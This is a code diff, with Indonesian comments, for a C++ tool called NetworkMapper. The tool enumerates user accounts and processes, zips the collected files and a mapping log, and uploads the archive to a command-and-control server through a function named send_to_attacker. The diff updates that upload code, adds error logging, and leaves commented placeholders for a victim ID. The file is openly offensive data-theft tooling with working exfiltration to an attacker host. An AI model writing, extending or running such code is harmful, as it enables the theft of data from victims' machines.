@@ -1,5 +1,5 @@
 #include "network_mapper.h"
-#include "httplib.h"    // simpan httplib.h di folder yang sama atau include path
+#include "httplib.h"    // pastikan httplib.h ada di folder yang sama atau di include path
 
 #include <iostream>
 #include <fstream>
@@ -28,6 +28,8 @@
 #include <arpa/inet.h>
 #include <pwd.h>
 #endif
+
+namespace fs = std::filesystem;
 
 // ==================== IMPLEMENTASI UMUM ====================
 
@@ -156,8 +158,9 @@ void NetworkMapper::enum_processes() {
     }
 }
 
-// ==================== UNIX/LINUX/MAC ====================
 #else
+
+// ==================== UNIX/LINUX/MAC ====================
 
 void NetworkMapper::enum_unix_users() {
     log("USER", "=== USER ACCOUNTS ===");
@@ -287,7 +290,7 @@ bool NetworkMapper::create_zip_archive(const std::vector<std::string>& paths, co
 
                 if (!entry.is_regular_file()) continue;
 
-                // Skip file terlalu besar (contoh: > 100 MB)
+                // Skip file terlalu besar (> 100 MB)
                 if (entry.file_size() > 100ULL * 1024 * 1024) {
                     skipped++;
                     continue;
@@ -308,7 +311,7 @@ bool NetworkMapper::create_zip_archive(const std::vector<std::string>& paths, co
         }
     }
 
-    // Sertakan log
+    // Sertakan log mapping
     if (fs::exists("network_mapping.log")) {
         zip_source_t* src = zip_source_file(z, "network_mapping.log", 0, 0);
         if (src) zip_file_add(z, "network_mapping.log", src, ZIP_FL_ENC_UTF_8);
@@ -321,7 +324,7 @@ bool NetworkMapper::create_zip_archive(const std::vector<std::string>& paths, co
     return true;
 }
 
-// ==================== PENGIRIMAN KE C2 (pakai cpp-httplib) ====================
+// ==================== PENGIRIMAN KE C2 ====================
 
 void NetworkMapper::send_to_attacker(const std::string& c2_url) {
     if (c2_url.empty()) {
@@ -330,7 +333,7 @@ void NetworkMapper::send_to_attacker(const std::string& c2_url) {
     }
 
     log("C2", "Memulai pengiriman ke: " + c2_url);
-    
+
     std::string zip_name = "collected_" + std::to_string(time(nullptr)) + ".zip";
 
     std::vector<std::string> targets;
@@ -343,23 +346,30 @@ void NetworkMapper::send_to_attacker(const std::string& c2_url) {
 
     httplib::Client cli(c2_url);
 
-    // Optional: skip verifikasi SSL (hanya untuk testing self-signed cert)
+    // Uncomment baris berikut jika server menggunakan sertifikat self-signed (untuk testing saja)
     // cli.set_ca_cert_path(nullptr);
 
-    httplib::MultipartFormDataItems items = {
-        { "file", httplib::MultipartFormData::File{zip_name, "application/zip"} }
+    httplib::UploadFormDataItems items = {
+        { "file", zip_name, zip_name, "application/zip" }
+        // Tambah field lain jika diperlukan, contoh:
+        // { "victim_id", "victim-12345", "", "" },
+        // { "timestamp", std::to_string(time(nullptr)), "", "" }
     };
-    std::string c2_url = "https://api.yourdomain.com";  // tanpa trailing slash
+
     auto res = cli.Post("/upload", items);
 
     if (res && res->status == 200) {
         log("C2", "Berhasil dikirim (status: " + std::to_string(res->status) + ")");
+        log("C2", "Respon body: " + res->body);
     } else {
         log("C2", "Gagal kirim: " +
             (res ? "status " + std::to_string(res->status) : "tidak ada respon"));
+        if (res) {
+            log("C2", "Detail error: " + res->body);
+        }
     }
 
-    // Opsional: hapus file ZIP setelah berhasil
+    // Opsional: hapus file ZIP setelah berhasil dikirim
     // fs::remove(zip_name);
 }
 
